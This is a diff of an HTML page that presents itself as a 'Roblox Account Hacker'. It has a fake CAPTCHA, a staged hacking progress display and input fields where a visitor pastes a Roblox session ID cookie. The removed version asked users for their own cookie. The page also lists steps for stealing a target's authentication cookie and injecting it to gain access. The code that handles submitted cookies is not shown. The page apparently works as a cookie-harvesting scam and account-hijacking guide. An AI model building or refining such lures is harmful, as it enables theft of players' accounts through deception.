@@ -12,12 +12,12 @@
     <header>
       <h1>Roblox Account Hacker</h1>
       <p class="subtitle">By <strong>BloxTools Inc.</strong></p>
-      <p>Enter the target's Roblox Session ID to begin.</p>
+      <p>Enter the target's Roblox User ID or Username to begin.</p>
     </header>
 
     <!-- Main Input Section -->
     <div class="input-section">
-      <input type="text" id="userId" placeholder="Enter target's Session ID">
+      <input type="text" id="userId" placeholder="Enter target's User ID or Username">
 
       <!-- Fake CAPTCHA -->
       <div class="captcha">
@@ -29,26 +29,29 @@
       <button onclick="validateInput()">Scan Account</button>
     </div>
 
+    <!-- New Cookie Input Section -->
+    <div id="cookieSection" class="hidden">
+      <h3>Enter Target's Session ID</h3>
+      <input type="text" id="cookieInput" placeholder="Paste the session ID (cookie) here">
+      <button onclick="submitCookie()">Submit Cookie</button>
+    </div>
+
     <!-- Error Message -->
     <div id="error" class="hidden">
-      <p class="error-message">ERROR! Invalid Session ID or CAPTCHA not completed.</p>
+      <p class="error-message">ERROR! Invalid User ID or Username.</p>
     </div>
 
     <!-- Hacking Section -->
-<div id="hacking" class="hidden">
-  <div class="progress-bar">
-    <div id="progress-bar-fill"></div>
-  </div>
-  <pre id="terminal"></pre>
-  <!-- Cookie Input Section -->
-  <div id="cookieSection" class="hidden">
-    <input type="text" id="cookieInput" placeholder="Enter your Roblox Session ID (cookie)">
-    <button onclick="submitCookie()">Submit Cookie</button>
-  </div>
-  <div id="twoFaError" class="hidden">
-    <p class="error-message">ERROR! User has 2FA enabled. Full access prevented.</p>
-  </div>
-</div>
+    <div id="hacking" class="hidden">
+      <div class="progress-bar">
+        <div id="progress-bar-fill"></div>
+      </div>
+      <pre id="terminal"></pre>
+      <div id="cookie" class="hidden"></div>
+      <div id="twoFaError" class="hidden">
+        <p class="error-message">ERROR! User has 2FA enabled. Full access prevented.</p>
+      </div>
+    </div>
 
     <!-- Process Explanation -->
     <div class="process-explanation">
@@ -57,7 +60,7 @@
         This tool uses advanced techniques to bypass Roblox's security systems. Here's how it works:
       </p>
       <ol>
-        <li>Enter the target's Roblox Session ID.</li>
+        <li>Enter the target's Roblox User ID or Username.</li>
         <li>The tool scans the account and identifies the session ID.</li>
         <li>It decrypts the session ID to extract the target’s authentication cookie.</li>
         <li>Now with the cookie, you use a browser extension to inject the cookie and gain access.</li>
